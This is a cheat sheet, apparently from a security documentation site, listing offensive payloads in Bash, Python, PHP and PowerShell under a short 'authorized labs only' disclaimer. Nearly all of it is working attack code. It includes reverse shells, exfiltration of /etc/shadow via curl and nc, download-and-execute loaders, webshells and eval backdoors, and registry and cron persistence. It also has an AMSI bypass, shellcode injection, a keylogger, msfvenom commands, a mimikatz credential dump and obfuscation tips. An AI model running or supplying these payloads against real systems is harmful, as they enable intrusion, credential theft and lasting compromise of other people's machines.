---
icon: chevron-up
---

# Common & Advanced Payloads

## **Common & Advanced Payloads — Bash, Python, PHP, PowerShell**

> ⚠️ Educational, controlled, and authorized environments only.\
> These payloads are for **security research, exploit development, and lab training** — **never deploy on real targets** without explicit written permission.\
> Everything below is designed for CTFs, malware analysis, and cyber range use.

***

### I. 🧩 Bash Payloads — The Unix Core Arsenal

#### 🔹 Reverse Shells (TCP)

```bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
bash -c 'exec bash -i &>/dev/tcp/10.10.14.2/4444 <&1'
```

#### 🔹 Reverse UDP Shell

```bash
bash -i >& /dev/udp/10.10.14.2/4444 0>&1
```

#### 🔹 File Exfiltration

```bash
tar czf - /etc | nc 10.10.14.2 9001
```

#### 🔹 Command Injection Payloads

```bash
; nc -e /bin/sh 10.10.14.2 4444 #
&& curl http://10.10.14.2/shell.sh | bash
`wget http://10.10.14.2/x.sh -O-|bash`
```

#### 🔹 Privilege Escalation Helper

```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
cat /etc/crontab
```

#### 🔹 Fork Bomb (for lab sandbox testing)

```bash
:(){ :|:& };:
```

***

### II. 🧠 Python Payloads — Execution, Exploitation, and Evasion

#### 🔹 Reverse Shell

```python
import socket, os, pty
s = socket.socket()
s.connect(("10.10.14.2",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

#### 🔹 File Download & Execution

```python
import urllib.request, os
url = "http://10.10.14.2/payload.sh"
path = "/tmp/run.sh"
urllib.request.urlretrieve(url, path)
os.system(f"bash {path}")
```

#### 🔹 Simple TCP Backdoor

```python
import socket,subprocess
s=socket.socket()
s.bind(("0.0.0.0",5555))
s.listen(1)
c,a=s.accept()
while True:
    data=c.recv(1024)
    if data.decode().strip()=="exit":break
    out=subprocess.getoutput(data.decode())
    c.send(out.encode())
```

#### 🔹 Reverse Shell Encoder

```python
import base64,os
cmd="bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"
os.system("echo %s | base64 -d | bash"%base64.b64encode(cmd.encode()).decode())
```

#### 🔹 Fileless Execution (in-memory)

```python
import requests
exec(requests.get("http://10.10.14.2/script.py").text)
```

#### 🔹 Persistence via Crontab

```python
import os
os.system('(crontab -l ; echo "* * * * * bash /tmp/rev.sh") | crontab -')
```

#### 🔹 Python Keylogger (for malware analysis labs)

```python
from pynput.keyboard import Listener
with open("/tmp/logs","a") as f:
    def write(key): f.write(str(key))
with Listener(on_press=write) as l: l.join()
```

***

### III. 🧱 PHP Payloads — Web Exploitation & Webshell Arsenal

#### 🔹 Classic One-Liner Reverse Shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'"); ?>
```

#### 🔹 Minimal Web Shell

```php
<?php system($_GET['cmd']); ?>
```

#### 🔹 Eval-based Backdoor

```php
<?php @eval($_POST['payload']); ?>
```

#### 🔹 Obfuscated Eval (common CTF filter bypass)

```php
<?php $x='system';$x($_GET['cmd']); ?>
<?php ${'x'.'x'} = 's'.'y'.'stem'; ${'x'.'x'}($_GET[1]); ?>
```

#### 🔹 File Upload & Write

```php
<?php
$file = $_FILES['up']['tmp_name'];
move_uploaded_file($file, "/var/www/html/" . $_FILES['up']['name']);
?>
```

#### 🔹 Reverse Shell via `fsockopen`

```php
<?php
$s=fsockopen("10.10.14.2",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

#### 🔹 Persistence Hook (for analysis)

```php
<?php
file_put_contents("/var/www/html/backdoor.php", "<?php system(\$_GET['cmd']); ?>");
?>
```

#### 🔹 Web Command Chain Execution

```php
<?php echo shell_exec('whoami && uname -a && id'); ?>
```

***

### IV. 🧰 PowerShell Payloads — Windows Post-Exploitation Core

#### 🔹 Basic TCP Reverse Shell

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.2",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
 $sendback = (iex $data 2>&1 | Out-String )
 $sendback2  = $sendback + 'PS ' + (pwd).Path + '> '
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 $stream.Write($sendbyte,0,$sendbyte.Length)
 $stream.Flush()
}
```

#### 🔹 Encoded Command Payload

```powershell
powershell -EncodedCommand <base64>
```

Encode:

```bash
echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

#### 🔹 Download & Execute (One-Liner)

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shell.ps1')"
```

#### 🔹 File Upload via HTTP POST

```powershell
Invoke-RestMethod -Uri http://10.10.14.2/upload -Method POST -InFile C:\loot.txt
```

#### 🔹 Persistent Backdoor (Run Key)

```powershell
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "Updater" "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shell.ps1')"
```

#### 🔹 AMSI Bypass (for EDR bypass research)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### 🔹 PowerShell to Memory Loader (advanced)

```powershell
IEX([System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('http://10.10.14.2/mem.ps1')))
```

#### 🔹 WinAPI Process Injection (for red team training)

```powershell
$code = @"
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt")] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
"@
$win32 = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
$buf = [Convert]::FromBase64String("BASE64_PAYLOAD")
$addr = $win32::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[void]$win32::memcpy($addr, $buf, $buf.Length)
$win32::CreateThread(0,0,$addr,0,0,0)
```

***

### V. 🧱 Advanced Hybrid Payloads

#### 🔹 Multi-stage Loader (Linux)

```bash
curl http://10.10.14.2/s1.sh | bash
wget -qO- http://10.10.14.2/s2.sh | bash
```

#### 🔹 Reverse Shell via DNS Tunneling (CTF trick)

```bash
dig @10.10.14.2 `whoami`.labdomain.com
```

#### 🔹 Exfil via HTTP + Base64

```bash
cat /etc/shadow | base64 | curl -d @- http://10.10.14.2/exfil
```

#### 🔹 Lateral Payload Dropper

```bash
scp payload.sh user@10.10.10.5:/tmp/
ssh user@10.10.10.5 "bash /tmp/payload.sh"
```

#### 🔹 Staged Reverse Shell (Base64 in Memory)

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==" | base64 -d | bash
```

***

### VI. 🧠 Mixed-Language Payload Chains (for Red Team Sim Labs)

| Stage                 | Language          | Example                          |
| --------------------- | ----------------- | -------------------------------- |
| **Initial Access**    | Bash              | Download & execute reverse shell |
| **Execution**         | Python            | Memory shell loader              |
| **Persistence**       | PowerShell        | Registry-based re-launcher       |
| **Evasion**           | PHP               | Encoded eval webshell            |
| **Command & Control** | PowerShell/Python | Encrypted HTTPS beacon           |

***

### VII. 🧰 msfvenom Payload Reference

| Platform            | Example Command                                                                                  |
| ------------------- | ------------------------------------------------------------------------------------------------ |
| Linux Reverse Shell | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf > shell.elf`         |
| Windows EXE         | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > shell.exe` |
| PHP                 | `msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=4444 -f raw > shell.php`                     |
| ASPX                | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx > shell.aspx`   |
| Python              | `msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.2 LPORT=4444 -f raw > shell.py`              |

***

### VIII. ⚡ Quick Payload Encoding Techniques

| Encoding                         | Example                                                                                                   |
| -------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **Base64 (Linux)**               | \`echo "payload"                                                                                          |
| **PowerShell Base64 (UTF-16LE)** | \`echo "IEX..."                                                                                           |
| **URL Encoding**                 | `python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'))"` |
| **XOR Encoding (Python)**        | `''.join(chr(ord(c)^0x41) for c in data)`                                                                 |

***

### IX. 🧱 Post-Exploitation Utilities (for Lab PrivEsc & Data Collection)

| Type                  | Command                                        |
| --------------------- | ---------------------------------------------- |
| **Credential Dump**   | `mimikatz.exe "sekurlsa::logonpasswords" exit` |
| **Hash Dump (Linux)** | `cat /etc/shadow`                              |
| **System Info**       | `whoami && uname -a && id`                     |
| **Network**           | `ip a && netstat -tuln && arp -a`              |
| **Persistence Check** | \`ps aux                                       |
| **History Harvest**   | `cat ~/.bash_history`                          |

***

### X. 🧠 Payload Integration Tips

* Always base64 or URL-encode payloads for command injection challenges.
* For webshells: test all wrappers — `system()`, `exec()`, `shell_exec()`, `passthru()`.
* Use HTTPS payload delivery in enterprise simulation (mimic real malware).
* Always clean up: `rm /tmp/rev*` after lab testing.
* Chain multi-stage payloads to simulate realistic intrusion flow.

***
